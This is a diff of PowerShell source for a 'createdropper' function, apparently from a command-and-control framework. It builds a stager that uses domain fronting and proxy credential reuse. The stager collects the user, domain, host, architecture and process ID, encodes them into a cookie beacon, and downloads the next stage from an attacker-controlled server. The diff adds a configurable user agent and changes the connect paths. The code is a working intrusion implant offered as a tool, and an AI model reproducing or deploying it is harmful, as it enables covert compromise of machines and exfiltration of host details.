@@ -1,14 +1,14 @@
 ﻿ #dropper
- function createdropper($killdate, $domainfrontheader, $ipv4address, $serverport, $username, $password, $proxyurl, [switch]$Daisy, [switch]$Proxy) {
+ function createdropper($killdate, $domainfrontheader, $ipv4address, $serverport, $username, $password, $proxyurl, [switch]$Daisy, [switch]$Proxy, $useragent) {
 
 if ($Daisy.IsPresent) { 
-    $connect="daisy"
+    $connect="connect?d"
     $server = "`$Server = `"$($ipv4address):$($serverport)`""
     $proxynone = "if (!`$proxyurl){`$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
 } elseif ($Proxy.IsPresent) { 
     $proxynone = ""
     $server = ""
-    $connect="proxy" 
+    $connect="connect?p" 
 } else { 
     $proxynone = ""
     $server = ""
@@ -29,7 +29,7 @@ $wc = New-Object System.Net.WebClient;
 '+$proxynone+'
 $h="'+$domainfrontheader+'"
 if ($h) {$wc.Headers.Add("Host",$h)}
-$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
+$wc.Headers.Add("User-Agent","'+$useragent+'")
 if ($proxyurl) {
 $wp = New-Object System.Net.WebProxy($proxyurl,$true); 
 if ($username -and $password) {
@@ -42,7 +42,7 @@ $wc.UseDefaultCredentials = $true;
 $wc.Proxy.Credentials = $wc.Credentials;
 } if ($cookie) { $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie") }
 $wc } function primer {
-if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
+if ($env:username -eq "$($env:computername)$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
 $pretext = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;'+$ipv4address+'")
 $pretext64 = [Convert]::ToBase64String($pretext)
 $primer = (Get-Webclient -Cookie $pretext64).downloadstring("'+$ipv4address+":"+$serverport+'/'+$connect+'")
